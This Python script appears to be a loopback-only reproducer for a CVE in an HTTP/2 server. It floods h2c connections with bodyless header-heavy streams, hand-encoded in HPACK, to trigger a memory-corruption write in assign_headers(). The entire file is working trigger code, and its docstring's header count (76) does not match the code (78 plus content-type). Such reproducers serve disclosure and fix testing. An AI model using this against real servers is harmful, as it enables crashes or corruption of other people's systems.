#!/usr/bin/env python3
"""Loopback-only multiplexed h2c driver for CVE-2026-119618.

Opens one cleartext HTTP/2 connection and sends many bodyless streams with
Content-Type, no Content-Length and 76 regular headers, so each stream's
assign_headers() reaches the wrong-pool write with nelts == nalloc == 80.
Manual HPACK literal-without-indexing; no external packages.

Usage: repro-h2c-mux.py [streams-per-connection] [connections] [port]
"""
import socket
import struct
import sys

streams = int(sys.argv[1]) if len(sys.argv) > 1 else 200
conns = int(sys.argv[2]) if len(sys.argv) > 2 else 10
port = int(sys.argv[3]) if len(sys.argv) > 3 else 18081

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def frame(ftype, flags, sid, payload):
    return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) + struct.pack(">I", sid) + payload


def lit(name, value):
    n, v = name.encode(), value.encode()
    assert len(n) < 128 and len(v) < 128
    return bytes([0x00, len(n)]) + n + bytes([len(v)]) + v


def headers_payload(sid):
    out = lit(":method", "GET") + lit(":scheme", "http")
    out += lit(":path", "/") + lit(":authority", "127.0.0.1:%d" % port)
    out += lit("content-type", "text/plain")
    for i in range(78):
        out += lit("x-f%d" % i, "v%d" % i)
    return out


total = 0
for c in range(conns):
    s = socket.create_connection(("127.0.0.1", port), timeout=10)
    s.sendall(PREFACE + frame(4, 0, 0, b""))
    for k in range(streams):
        sid = 1 + 2 * k
        payload = headers_payload(sid)
        s.sendall(frame(1, 0x05, sid, payload))  # END_HEADERS | END_STREAM
        total += 1
    # Keep reading briefly so the connection thread stays active.
    s.settimeout(2)
    try:
        while s.recv(65536):
            pass
    except (socket.timeout, ConnectionError, OSError):
        pass
    s.close()
print("sent_streams=%d connections=%d" % (total, conns))
